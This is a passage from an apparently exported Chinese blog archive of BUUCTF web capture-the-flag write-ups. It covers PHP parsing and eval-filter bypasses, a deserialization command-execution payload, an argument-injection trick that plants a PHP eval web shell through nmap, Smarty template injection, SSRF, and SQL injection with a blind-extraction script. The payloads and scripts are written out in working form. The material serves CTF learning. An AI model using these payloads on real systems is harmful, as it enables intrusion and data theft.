php命名规则\n\n一开始做的时候以为这道题出问题了，最后发现这里有坑。\n\n先来看本地测试，如果我们直接给NS_CTF.go传值，传入后会是什么呢？\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927046246-3e3675f4-af68-4d8e-9be3-1c63a5ebffff.png)\n\n可见当我们传入的点号被改为了下划线，这里是因为点号在php内是非法命名符，会被转化为下划线\n\n官方文档中有提到：https://www.php.net/manual/zh/language.variables.external.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927257277-ddeecad1-21b1-4a85-be39-e28b4bd87882.png)\n\n那么该怎么绕过呢 这里参考：https://xz.aliyun.com/t/11512\n\n构造payload: `NS[CTF.go=1`就能绕过 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927514308-229d457c-463c-44b8-ab89-bda1cb695b70.png)\n\n这里会把第一个`[`先转化为下划线然后第二个点就不会被转化了\n\n这里我认为是php解析时把第一个`[`当作了数组的标志但不合法就给转化了 然后以为点是数组里的元素名从而没有转化为下划线\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927469133-3fe86fe3-7032-474b-9f2b-458df0d365ef.png)\n\n这个bug只有当php版本小于8时才会有：参考：https://blog.csdn.net/mochu7777777/article/details/115050295\n\nphp8版本修复了这个bug，如图\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679979254109-272268cf-7aef-41f0-af9c-6a23471c0c42.png)\n\n\n\n## 无数字字母rce\n\n这里用到了异或绕过，直接脚本生成，真的很方便 放大佬的理解：https://xz.aliyun.com/t/11929#toc-4 \n\n总结的非常好透彻，我就不在这里多言了qwq\n\n放一下构造脚本把：\n\n```python\nimport re\nimport requests\nimport urllib\nfrom sys import *\nimport os\n\n\na=[]\nans1=\"\" \nans2=\"\"\nfor i in range(0,256): #设置i的范围\n    c=chr(i)\n    #将i转换成ascii对应的字符，并赋值给c\n    tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-',c,re.I)\n    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符\n    if(tmp):\n        continue\n        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可\n    else:\n        a.append(i)\n        #在数组中增加i，这些就是未被系统过滤掉的字符\n\n\n# eval(\"echo($c);\");\nmya=\"system\"  #函数名 这里修改！\nmyb=\"dir\"      #参数\ndef myfun(k,my): #自定义函数\n    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错\n    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错\n    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 \n        for j in range(i,len(a)): #在上个循环的条件下设置j的范围\n            if(a[i]^a[j]==ord(my[k])):\n                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])\n                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])\n                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符\nfor x in range(0,len(mya)): #设置k的范围\n    myfun(x,mya)#引用自定义的函数\ndata1=\"('\"+urllib.request.quote(ans1)+\"'^'\"+urllib.request.quote(ans2)+\"')\" #data1等于传入的命令,\"+ans1+\"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值\nprint(data1)\nans1=\"\"#对ans1进行重新赋值\nans2=\"\"#对ans2进行重新赋值\nfor k in range(0,len(myb)):#设置k的范围为(0,len(myb))\n    myfun(k,myb)#再次引用自定义函数\ndata2=\"(\\\"\"+urllib.request.quote(ans1)+\"\\\"^\\\"\"+urllib.request.quote(ans2)+\"\\\")\"\nprint(data2)\n```\n","tags":["RCE奇淫方式","PHP反序列化","linux通配符","getshell","md5 sha1强相等"],"categories":["各赛事WP"]},{"title":"buuctf 38-[GXYCTF2019]禁止套娃","url":"/post/2ed7a105.html","content":"\nbuuctf 38-[GXYCTF2019]禁止套娃\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337192.png)\n\n\n\n开局一张图，buu网站扫网站有时候出不来，看了别人的wp是git源码泄露了 参考大佬的文章：https://www.freebuf.com/articles/web/346607.html \n\n可以拿config文件测试一下\n\n构造payload：`http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git.config` \n\n • **config：**文件包含项目特有的配置选项，git config命令会改动它；  \n\n发现有文件下载下来 说明是github源码泄露\n\n下好脚本 构造payload：`python2 GitHack.py http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git` 注意末尾加上 `.git` ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337237.png)\n\n查看index.php \n\n```php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n```\n\n主要是过滤了一些伪协议和一些`“et”“na”“info”“dec”“bin”“hex”“oct”“pi”“log”`字符\n\n最重要的是中间一层 有我不知道的正则表达式的知识点 参考：https://blog.csdn.net/Manuffer/article/details/120738755\n\n```\nif(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']))\n```\n\n这里`(?R)`代表当前表达式 ,就是这个`(/[a-z,_]+((?R)?)/)`，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配`a(b(c(d())))` 注意这里加号不是把前后连接起来 +：加号在正则表达式有特殊含义，等同于匹配前面的子表达式一次或多次\n\n当`;`等于后面匹配完以后剩余的`;`条件成立  可以根据这个思路构造命令执行\n\n### 方法一：\n\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。\n\n(PHP 4, PHP 5, PHP 7, PHP 8)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337225.png)\n\n返回一个数组 第一个元素为`.` 构造payload的时候可以用的 `.` 和 `./` 意思相同都是当前目录 `../`是上级目录 \n\ncurrent() — 返回数组中的当前值\n\n说明:\n\ncurrent(array|object $array): mixed\n\n每个数组中都有一个内部的指针指向它“当前的”单元，初始化时会指向该数组中的第一个值。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337217.png)\n\n构造`?exp=print_r(scandir(current(localeconv())));`\n\n所以这个组合scandir(current(localeconv()))很常用，可以记一下。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337258.png)\n\n发现flag文件，接下来就是怎么读了，因为现在指针指在第一个元素上 把数组反转过来让flag文件在正数第二 再通过next()指向第二个元素读取flag\n\narray_reverse() — 返回单元顺序相反的数组\n\nnext() — 将数组中的内部指针向前移动一位\n\nshow_source — 别名 highlight_file() 用哪个都行\n\n构造payload:`?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337248.png)\n\n### 方法二：\n\n通过修改phpsession即会话状态 然后payload读出来即可 参考还是上面的文章 https://blog.csdn.net/Manuffer/article/details/120738755\n\nsession_id()可以用来获取/设置当前会话 ID,可以用这个函数来获取cookie中的`phpsessionid`了，并且这个值我们是可控的。\n\n但session_id必须要开启session才可以使用，所以我们要先使用session_start。\n\n构造payload:`?exp=show_source(session_id(session_start()));`\n\nbp抓包修改`session_id=flag.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337617.png)\n","tags":["源码泄露","GitHack","(?R)","嵌套构造","PHPSESSION"]},{"title":"buuctf 37-[网鼎杯 2020 朱雀组]phpweb","url":"/post/6d6051d0.html","content":"\nbuuctf [网鼎杯 2020 朱雀组]phpweb\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340646.png)\n\n发现可以直接获取我们的时间，并且每五分钟刷新更新一次，大致意思就是利用系统时区设置，最重要的是应该是这个网页通过php 里的data()函数来获取当前我们的时间，并且在网页源代码中也标出来了，应该算是提示。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340325.png)\n\n并且发现 通过post方式 给`$func`传值为 `data`    `$p` 传值为`Y-m-d h:i:s a` data()函数格式化时间用的\n\n所以就可以 用system() 函数命令执行了 但是肯定不行 被河蟹了 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340430.png)\n\n发现随便输入时 会爆出call_user_func()函数 这个函数简单来说就是用第一个输入值作为回调函数 第二个输入为第一个回调函数的参数 \n\n直接使用file_get_contents() 本来想直接爆出flag文件的内容 但是命名被改为别的形式了 呢就爆一下index.php看一下黑名单\n\n```plain\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n\n\n看到类就想到反序列化漏洞 将类中的属性值改为我们可以恶意操作的值 然后给`$func`传反序列化函数，给`p`传我们的序列化结果。\n\n思路就是直接反序列化将原本post值修改 不通过黑名单筛选\n\n本地构造：\n\n```php\n<?php\n    class Test {\n        var $p = \"ls /\";\n        var $func = \"system\";}\n$a = new Test;\necho serialize($a);\n?>\n```\n\n构造payload：`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:4:\"ls /\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340578.png)\n\n发现并没有flag文件 所以只能通过find指令寻找了 这里省略 我这里find找不出来没有回响 环境有问题\n\n最后构造payload：`func=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"cat /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340505.png)\n","tags":["文件包含","反序列化","代码审计"],"categories":["buuctf"]},{"title":"buuctf 36-[BUUCTF 2018]Online Tool","url":"/post/9efd4054.html","content":"\nbuuctf [BUUCTF 2018]Online Tool\n\n<!--more-->\n\n源码附上\n\n```php\n<?php\n\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n\nif(!isset($_GET['host'])) {\n    highlight_file(__FILE__);\n} else {\n    $host = $_GET['host'];\n    $host = escapeshellarg($host);\n    $host = escapeshellcmd($host);\n    $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']);\n    echo 'you are in sandbox '.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);\n}\n```\n\n有许多不清楚的知识，一个一个来看\n\n$_SERVER\n\n$_SERVER 是PHP预定义的超全局变量。所谓“超全局变量”，即在脚本全部作用域中都可以使用，保存关于报头、路径和脚本位置的信息。\n\n$_SERVER详解\n$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]//浏览器语言\n$_SERVER[‘REMOTE_ADDR’] //当前用户 IP 。\n$_SERVER[‘REMOTE_HOST’] //当前用户主机名\n$_SERVER[‘REQUEST_URI’] //URL\n$_SERVER[‘REMOTE_PORT’] //端口。\n$_SERVER[‘SERVER_NAME’] //服务器主机的名称。\n$_SERVER[‘PHP_SELF’]//正在执行脚本的文件名\n$_SERVER[‘argv’] //传递给该脚本的参数。\n$_SERVER[‘argc’] //传递给程序的命令行参数的个数。\n$_SERVER[‘GATEWAY_INTERFACE’]//CGI 规范的版本。\n$_SERVER[‘SERVER_SOFTWARE’] //服务器标识的字串\n$_SERVER[‘SERVER_PROTOCOL’] //请求页面时通信协议的名称和版本\n$_SERVER[‘REQUEST_METHOD’]//访问页面时的请求方法\n$_SERVER[‘QUERY_STRING’] //查询(query)的字符串。\n$_SERVER[‘DOCUMENT_ROOT’] //当前运行脚本所在的文档根目录\n$_SERVER[‘HTTP_ACCEPT’] //当前请求的 Accept: 头部的内容。\n$_SERVER[‘HTTP_ACCEPT_CHARSET’] //当前请求的 Accept-Charset: 头部的内容。\n$_SERVER[‘HTTP_ACCEPT_ENCODING’] //当前请求的 Accept-Encoding: 头部的内容\n$_SERVER[‘HTTP_CONNECTION’] //当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。\n$_SERVER[‘HTTP_HOST’] //当前请求的 Host: 头部的内容。\n$_SERVER[‘HTTP_REFERER’] //链接到当前页面的前一页面的 URL 地址。\n$_SERVER[‘HTTP_USER_AGENT’] //当前请求的 User_Agent: 头部的内容。\n$_SERVER[‘HTTPS’]//如果通过https访问,则被设为一个非空的值(on)，否则返回off\n$_SERVER[‘SCRIPT_FILENAME’] #当前执行脚本的绝对路径名。\n$_SERVER[‘SERVER_ADMIN’] #管理员信息\n$_SERVER[‘SERVER_PORT’] #服务器所使用的端口\n$_SERVER[‘SERVER_SIGNATURE’] #包含服务器版本和虚拟主机名的字符串。\n$_SERVER[‘PATH_TRANSLATED’] #当前脚本所在文件系统（不是文档根目录）的基本路径。\n$_SERVER[‘SCRIPT_NAME’] #包含当前脚本的路径。这在页面需要指向自己时非常有用。\n$_SERVER[‘PHP_AUTH_USER’] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。\n$_SERVER[‘PHP_AUTH_PW’] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。\n$_SERVER[‘AUTH_TYPE’] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型\n\n第一部分\n\nX-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段\n\n```php\nif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n```\n\n获取本机的ip\n\n第二部分：\n\n有两个很重要的函数\n\n**escapeshellarg会首先在单引号前加反斜线，然后将单引号分割的几部分，都用单引号括起来****\n****escapeshellcmd会将&#;`|\\*?~<>^()[]{}$\\, \\x0A 和 \\xFF以及不配对的单/双引号转义**\n\n举个例子\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341140.png)\n\n注意这里环境一定要在linux才行 如果环境在window会出现以下情况，目前还没弄懂是啥原因\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341179.png)\n\n这样当这两个函数混合在一起使用时，就会导致，转义的单引被绕过。\n\n有了著名的漏洞 附上大佬的链接学习 https://paper.seebug.org/164/\n\n题目中给出的是nmap命令，拼接上我们可控的参数$host，那么就可以通过添加nmap参数执行将命令和结果写入文件的操作，写入一句话木马。目前还没有学习到nmap，暂时先不解释。\n\nnmap写入文件的参数是 -oG\n\n\n\nmkdir ()— 新建目录\n\nchdir ()— 改变目录\n\n构造peyload\n\n```\n?host='<?php @eval($_POST[x]); ?> -oG 1.php '` 注意此处有空格 当时一直没做出来 要有空格 不然nmap执行后面的文件就会变成 `1.php//\n```\n\n经过两次函数之后\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341131.png)\n\n```\n''\\\\''\\<\\?php @eval\\(\\$_POST\\[\"hack\"\\]\\)\\;\\?\\>  -oG 1.php '\\\\'''\n```\n\n图片不知道为啥把我eval中的内容吞了不知道为啥\n\n相当于\n\n```\n\\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\n```\n\n相当于执行了 \n\n```\nsystem(\"nmap -T5 -sT -Pn --host-timeout 2 -F \\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341212.png)\n\n产生的文件夹名 被md5加密了\n\n之后访问的时候加上就行\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341036.png)\n\n感悟: nmap还一点都没有学习，做这个题费了好大劲，之后有空要去涉略一下nmap。\n","tags":["nmap","$_SERVER","esc***函数"],"categories":["buuctf"]},{"title":"buuctf 35-[BJDCTF2020]The mystery of ip","url":"/post/a4341e77.html","content":"\nbuuctf [BJDCTF2020]The mystery of ip\n\n<!--more-->\n\n这道题考到了模板注入简单记录一些吧  参考：https://houbb.github.io/2020/08/09/web-safe-12-ssti\n\n服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题.  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342348.png)\n\n获取到了我们的ip，第一时间就想到了修改xff\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342770.png)\n\n但是没啥用 思路大概是就是利用xff 进行恶意读取吧 看了wp 是php的smarty模板注入 参考：https://www.anquanke.com/post/id/272393\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342128.png)\n\n代码直接运行了 于是直接进行命令执行就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342033.png)\n\n直接读根目录flag文件就行了\n","tags":["模板注入","xff","smarty模板"],"categories":["buuctf"]},{"title":"buuctf 34-[RoarCTF 2019]Easy Java","url":"/post/d05894c4.html","content":"\nbuuctf 34-[RoarCTF 2019]Easy Java\n\n<!--more-->\n\n弱口令能爆出来：\n\n账号:admin\n\n密码: admin888\n\n但是没啥用 还是所以只剩下登录页面的帮助了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343030.png)\n\n这里考到了java 的 WEB-INF 知识点 参考：https://www.cnblogs.com/shamo89/p/9948707.html\n\n但是这里通过get方式传参是不行的 只能通过post\n\n构造 payload： `filename=WEB-INF/web.xml`\n\nWEB-INF/web.xml  ： Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则   可以找到flag的位置以及命名方式\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343221.png)\n\n找到了flag的地址 以及他的命名文件\n\n秉持java 万物都是类的原则 要读取flag 就要读这个flag类\n\nWEB-INF/classes/\n\n 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）  \n\n构造payload ：`filename=WEB-INF/classes/com/wm/ctf/FlagController.class`不要忘了class后缀 一开始就忘了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343109.png)\n\n解码 得到flag！\n","tags":["弱口令","java"],"categories":["buuctf"]},{"title":"buuctf 33-[网鼎杯 2018]Fakebook","url":"/post/c6fe9d66.html","content":"\nbuuctf [网鼎杯 2018]Fakebook\n\n<!--more-->\n\n日常访问robots.txt文件\n\n robots.txt 文件规定了搜索引擎抓取工具可以访问您网站上的哪些网址。  \n\n发现有个文件可以打开\n\n附上源码：\n\n```plain\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n```\n\n是一个php写的类 然后用了curl\n\ncurl:https://blog.csdn.net/yangyu112654374/article/details/4658854\n\n然后发现有 `$output = curl_exec($ch)` 可以将类中`blog`重新构造用来执行ssrf漏洞\n\nhttps://xz.aliyun.com/t/11215 直接看大佬的总结\n\n申请一个账号进入可以看到存在sql注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344592.png) \n\n判断是什么类型注入\n\n`no=1 and 1=1#` 可以\n\n`no=1 and 1=2#` 不行\n\n说明这是数字注入\n\n`?no=0 order by 4#`  四列\n\n报错注入(这里比较推荐报错 联合查询的话一开始找不到回显点 可能是我眼瞎)\n\n其实是过滤了 `union select` 用`union/**/select` 绕过就行\n\n`1 and updatexml(1,concat('~',database(),'~'),3)#` 注意~ 不能用十六进制的 0x7e 这里有检测 用回原型好就行\n\n[*] query error! (XPATH syntax error: '~fakebook~')\n\n```\n1 and updatexml(1,concat('~',select user(),'~'),3)# \n```\n\n联合注入\n\n```\n?no=-1 union/**/select 1,database(),3,4#\n```\n\nfakebook\n\n```\n?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'#\n```\n\nusers\n\n```\n?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#\n```\n\nno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\n\n `?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users#`\n\n 1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:11:\"www.123.com\";}\n\n 利用ssrf漏洞 读取内容\n\n构造类里的 blog属性值为 `s:29:\"file:///var/www/html/flag.php\"`\n\n 构造payload: `?no=-1 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'`\n\n得到base64码\n\n```\nPD9waHANCg0KJGZsYWcgPSAiZmxhZ3s1MTkzODdkNS02OWQ2LTQ0OGEtYWQyZS0wODgxYmJkOThiNDl9IjsNCmV4aXQoMCk7DQo=\n```\n\n<?php\n\n\n\n$flag = \"flag{519387d5-69d6-448a-ad2e-0881bbd98b49}\";\n\nexit(0);\n\n\n\n法二：\n\n```\n?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4#\n```\n\n之前看到用户是管理员 所以联想到用load_file函数\n\n去这里看https://www.cnblogs.com/junlebao/p/14104036.html\n","tags":["sql注入","robots.txt","反序列化","curl","ssrf"],"categories":["buuctf"]},{"title":"buuctf 32-[CISCN2019 华北赛区 Day2 Web1]Hack World","url":"/post/3b320c12.html","content":"\nbuuctf CISCN2019 华北赛区 Day2 Web1]Hack World\n\n<!--more-->\n\n这道题是一道比较经典的布尔盲注的题目，也就全当作是学习了。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344880.png)\n\n题目表示flag在flag表里的flag字段里 这点就很可疑\n\n输入 1，2都有正确的回显\n\n输入`1'`时显示\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344854.png)\n\n显示布尔（错误），这里就可以判断是布尔注入了\n\n好好学习一下布尔盲注的知识：\n\n这里有篇布尔盲注的的文章：https://blog.csdn.net/wangyuxiang946/article/details/123486880 可以学习学习\n\nsubstr(string,开始1，长度)函数 用于截取字符串的部分字符串\n\nasscii() 用于将字符转化成ascii编码\n\n这里本地搭了一个环节测试\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344816.png)\n\n在题目测试一下\n\n```\nselect ascii(substr((select flag from flag),1,1))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344111.png)\n\n发现被过滤了 fuzz一下哪些被过滤了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344901.png)\n\n发现一些常用的 空格 `or union` 都被过滤了 `/**/`绕过空格也被过滤了 所以只能用`()`来绕过\n\n构造payload：\n\n```\nselect(ascii(substr((select(flag)from(flag),1,1)))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344886.png)\n\n正常回显了\n\n这里再用到mysql 的if语句\n\nif(条件，成功回显，失败回显)\n\n本地测试\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344175.png)\n\n这是为什么条件等于84 是因为 我本地flag的第一个字母为T ascii编码为84\n\n构造payload：`if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344201.png)\n\n成功回显 至于为什么是102 因为flag开头f 的ascii编码为102\n\n那么就可以借助脚本，这里因为我python没怎么学，脚本不会写\n\n但是整体脚本思路为 当匹配字符ascii 与题目相同时回显1 否则回显0 脚本根据题目回显的语句进行判断\n\n然后遍历整个32-126 ascii编码字符\n\n这里放一下大佬的脚本：\n\n```python\nimport requests\nimport time\nimport re\nurl='http://4fdaca11-2d67-4dbe-b046-a42e64af5917.node4.buuoj.cn:81/index.php'\nflag = ''\nfor i in range(1,43):\n    max= 127\n    min = 0\n    for c in range(0,127):\n        s = (int)((max+min)/2)\n        payload = '0^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'\n        r = requests.post(url,data = {'id':payload})\n        time.sleep(0.005)\n        if 'Hello, glzjin wants a girlfriend.' in str(r.content):\n            min=s\n        else:\n            max=s\n        if((max-min)<=1):\n            flag+=chr(max)\n            print(flag)\n            break\n```\n\n以后有时间要滚去学习写写脚本了qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344220.png)\n","tags":["sql注入","脚本"],"categories":["buuctf"]},{"title":"buuctf 31-[GYCTF2020]Blacklist","url":"/post/a8bde72c.html","content":"\nbuuctf [GYCTF2020]Blacklist\n\n<!--more-->\n\n这道题又是一道学习的题目，打开看到界面ui很像一道堆叠注入的题目，刚好这道题也是用堆叠注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345646.png)\n\n查字段：`1' order by 3#`\n\n`error 1054 : Unknown column '3' in 'order clause'` 只有两列\n\n这道题过滤了 \n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\n不能用预编译 select 报错注入应该是\n\n```\n1'; show databases#\n```\n\n\"supersqli\"\n\n```\n1'; show tables#\n```\n\n\"FlagHere\"\n\n```\n1';show columns from FlagHere#\n```\n\n直接用`1';desc FlagHere#`也可以\n\n  string(4) \"flag\"\n\ndesc用法：\n\n1.查表的详细信息  eg：`desc table_name;`\n\n2.desc降序排列数据  eg: `select select ename,sal from emp order by sal desc; `\n\n手动指定按照薪水由大到小排序（降序关键字desc）\n\n然后这里用到了 mysql handler语句查询字段内的信息\n\n这条语句使我们能够一行一行的浏览一个表中的数据\n\n下面在本地搭了一个环境进行测试 如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345725.png)\n\n之后就可以构造payload：\n\n```\n1';HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# \n```\n\n成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345650.png)\n","tags":["sql注入","堆叠注入","handler用法"],"categories":["buuctf"]},{"title":"buuctf 